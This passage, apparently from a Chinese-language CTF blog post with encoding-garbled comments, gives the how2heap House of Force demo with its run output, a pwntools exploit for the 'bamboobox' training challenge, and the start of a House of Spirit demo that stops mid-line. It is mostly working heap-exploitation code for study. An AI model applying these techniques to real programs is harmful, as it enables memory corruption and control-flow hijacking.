class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This PoC works also with ASLR enabled.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   ( http://phrack.org/issues/66/10.html )</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-comment">// bssæ®µä¸Šçš„ä¸€ä¸ªå­—ç¬¦ä¸²</span><br><span class="hljs-type">char</span> bss_var[] = <span class="hljs-string">&quot;This is a string that we want to overwrite.&quot;</span>;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><br><span class="hljs-string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Its current value is: %s\n&quot;</span>, bss_var);<br><br><br><br><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);<br><br><span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">256</span>);<br><span class="hljs-comment">// ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å †å—çš„ä½ç½®</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);<br><br><span class="hljs-type">int</span> real_size = malloc_usable_size(p1);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br><br><span class="hljs-comment">// æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¼æ´æ¥ä¿®æ”¹top chunkçš„å¤´éƒ¨</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);<br><br><br><br><span class="hljs-comment">//----- VULNERABILITY ----</span><br><br><span class="hljs-type">intptr_t</span> *ptr_top = (<span class="hljs-type">intptr_t</span> *) ((<span class="hljs-type">char</span> *)p1 + real_size - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);<br><br><br><span class="hljs-comment">// ä½¿top chunkçš„sizeå˜å¤§ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šä½¿ç”¨åˆ°mmapè¿™ä¸ªå‡½æ•°</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><span class="hljs-comment">// è®¾ç½®top chunkçš„sizeä¸º-1</span><br>*(<span class="hljs-type">intptr_t</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)) = <span class="hljs-number">-1</span>;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *)((<span class="hljs-type">char</span> *)ptr_top + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))));<br><br><span class="hljs-comment">//------------------------</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><br>   <span class="hljs-string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><br>   <span class="hljs-string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);<br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">// reqæ˜¯è¯·æ±‚çš„å¤§å°ï¼Œdestæ˜¯æˆ‘ä»¬çš„ç›®æ ‡åœ°å€</span><br><span class="hljs-comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * new_top = old_top + nb</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * nb = new_top - old_top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * req + 2sizeof(long) = new_top - old_top</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * req = new_top - old_top - 2sizeof(long)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="hljs-comment">// è®¡ç®—å¾—åˆ°æœ€ç»ˆçš„è¯·æ±‚å¤§å°</span><br><span class="hljs-comment"> * req = dest - old_top - 4*sizeof(long)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> evil_size = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)bss_var - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">4</span> - (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr_top;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><br>   <span class="hljs-string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);<br><br><span class="hljs-type">void</span> *new_ptr = <span class="hljs-built_in">malloc</span>(evil_size);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)*<span class="hljs-number">2</span>);<br><br><br><br><span class="hljs-type">void</span>* ctr_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... old string: %s\n&quot;</span>, bss_var);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);<br><br><span class="hljs-built_in">strcpy</span>(ctr_chunk, <span class="hljs-string">&quot;YEAH!!!&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... new string: %s\n&quot;</span>, bss_var);<br><br><br><br>assert(ctr_chunk == bss_var);<br><br><br><br><br><br><span class="hljs-comment">// some further discussion:</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><br><span class="hljs-comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><br><span class="hljs-comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><br><br><br><span class="hljs-comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><br><span class="hljs-comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><br><br><br><span class="hljs-comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/house$ ./house_of_force<br><br>Welcome to the House of Force<br><br>The idea of House of Force is to overwrite the top chunk and let the <span class="hljs-built_in">malloc</span> <span class="hljs-keyword">return</span> an arbitrary value.<br>The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when <span class="hljs-built_in">malloc</span> asks <span class="hljs-keyword">for</span> more space from the os.<br><br>In the end, we will use this to overwrite a variable at <span class="hljs-number">0x602080</span>.<br>Its current value is: This is a <span class="hljs-built_in">string</span> that we want to overwrite.<br><br>Let<span class="hljs-number">&#x27;</span>s allocate the first chunk, taking space from the wilderness.<br>The chunk of <span class="hljs-number">256</span> bytes has been allocated at <span class="hljs-number">0x8ff000</span>.<br><br>Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.<br>Real size (aligned and all that jazz) of our allocated chunk is <span class="hljs-number">280.</span><br><br>Now let<span class="hljs-number">&#x27;</span>s emulate a vulnerability that can overwrite the header of the Top Chunk<br><br>The top chunk starts at <span class="hljs-number">0x8ff110</span><br><br>Overwriting the top chunk size with a big value so we can ensure that the <span class="hljs-built_in">malloc</span> will never call mmap.<br>Old size of top chunk <span class="hljs-number">0x20ef1</span><br>New size of top chunk <span class="hljs-number">0xffffffffffffffff</span><br><br>The size of the wilderness is now gigantic. We can allocate anything without <span class="hljs-built_in">malloc</span>() calling mmap.<br>Next, we will allocate a chunk that will get us right up against the desired region (with an integer<br>overflow) and will then be able to allocate a chunk right over the desired region.<br><br>The value we want to write to at <span class="hljs-number">0x602080</span>, and the top chunk is at <span class="hljs-number">0x8ff110</span>, so accounting <span class="hljs-keyword">for</span> the header size,<br>we will <span class="hljs-built_in">malloc</span> <span class="hljs-number">0xffffffffffd02f50</span> bytes.<br>As expected, the new pointer is at the same place as the old top chunk: <span class="hljs-number">0x8ff110</span><br><br>Now, the next chunk we overwrite will point at our target buffer.<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>) =&gt; <span class="hljs-number">0x602080</span>!<br>Now, we can finally overwrite that value:<br>... old <span class="hljs-built_in">string</span>: This is a <span class="hljs-built_in">string</span> that we want to overwrite.<br>... doing <span class="hljs-built_in">strcpy</span> overwrite with <span class="hljs-string">&quot;YEAH!!!&quot;</span>...<br>... new <span class="hljs-built_in">string</span>: YEAH!!!<br></code></pre></td></tr></table></figure><p><code>libc_2.29</code>å¢åŠ äº†å¯¹top_chunkçš„sizeçš„æ£€æŸ¥ï¼ˆ<code>size &gt; av-&gt;system_mem</code>ï¼‰ï¼Œé™¤éæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹<code>av-&gt;system_mem</code>ï¼Œå¦åˆ™è¯¥æ–¹æ³•å¤±æ•ˆã€‚</p><h4 id="hitcon-traning-bamboobox"><a href="#hitcon-traning-bamboobox" class="headerlink" title="hitcon_traning_bamboobox"></a>hitcon_traning_bamboobox</h4><p>å°†top_chunkè½¬ç§»åˆ°å­˜æ”¾å‡½æ•°æŒ‡é’ˆçš„chunké™„è¿‘ï¼Œå†æ¬¡åˆ†é…å †å—ä¿®æ”¹å‡½æ•°æŒ‡é’ˆä¸ºåé—¨å‡½æ•°ã€‚</p><p>WPå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&quot;./bamboobox&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>magic = <span class="hljs-number">0x400D49</span><br><br>sdla = <span class="hljs-keyword">lambda</span> infor, data : sh.sendlineafter(infor, data)<br>sda = <span class="hljs-keyword">lambda</span> infor, data : sh.sendafter(infor, data)<br>sd = <span class="hljs-keyword">lambda</span> data : sh.send(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, context</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sda(<span class="hljs-string">&quot;Please enter the name of item:&quot;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">index, size, context</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    sdla(<span class="hljs-string">&quot;Please enter the length of item name:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br>    sda(<span class="hljs-string">&quot;Please enter the new name of the item:&quot;</span>, context)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">index</span>):<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sdla(<span class="hljs-string">&quot;Please enter the index of item:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    sdla(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># top_chunk.size -&gt; -1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>change(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br><span class="hljs-comment"># req = dest - old_top - 0x10</span><br>req = -<span class="hljs-number">0x70</span><br>add(req, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(sh)</span><br>add(<span class="hljs-number">0x10</span>, p64(magic)*<span class="hljs-number">2</span>)<br>quit()<br>sh.recv()<br></code></pre></td></tr></table></figure><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>å¦‚æœæˆ‘ä»¬å¸Œæœ›å¯¹ä¸€å—fastbinå¤§å°çš„ä¸å¯æ§å†…å­˜åŒºåŸŸè¿›è¡Œè¯»å†™ï¼Œå¹¶æ°å¥½æ»¡è¶³ä¸€ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li>è¯¥åŒºåŸŸçš„å‰åå¯æ§</li><li>å­˜åœ¨ä¸€ä¸ªå¯æ§æŒ‡é’ˆå¯ä»¥ä½œä¸ºfree()çš„å‚æ•°</li></ul><p>è¯¥æŠ€æœ¯ä¸€èˆ¬ç”¨æ¥è¾…åŠ©æ ˆæº¢å‡ºï¼Œå‡å¦‚æˆ‘ä»¬èƒ½å¤Ÿè¦†ç›–ä¸€ä¸ªå³å°†è¢«é‡Šæ”¾çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘è¿”å›åœ°å€é™„è¿‘ï¼Œå¹¶åœ¨é™„è¿‘æ„é€ ä¸€ä¸ªfake_chunkï¼Œå†åˆ©ç”¨è¯¥æŠ€æœ¯å°†fake_chunkå˜æˆä¸€ä¸ªçœŸæ­£çš„chunkã€‚</p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>PREV_INUSE</code>ä½ä¸ä¼šå½±å“freeçš„ç»“æœï¼Œä½†æ˜¯<code>IS_MMAPPED</code>å’Œ<code>NON_MAIN_ARENA</code>éƒ½è¦ä¸ºé›¶ï¼Œå…¶æ¬¡ï¼Œfake_chunkçš„sizeè¦åœ¨32åˆ°128ä¹‹é—´ï¼Œnext_chunkçš„sizeå¿…é¡»è¦å¤§äº0x10å¹¶ä¸”å°äº<code>av-&gt;system_mem</code>ï¼ˆå³å°äº0x21000ï¼‰ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a;<br><br><span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br><br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br><br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br><br>fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br><br>a = &amp;fake_chunks[<span 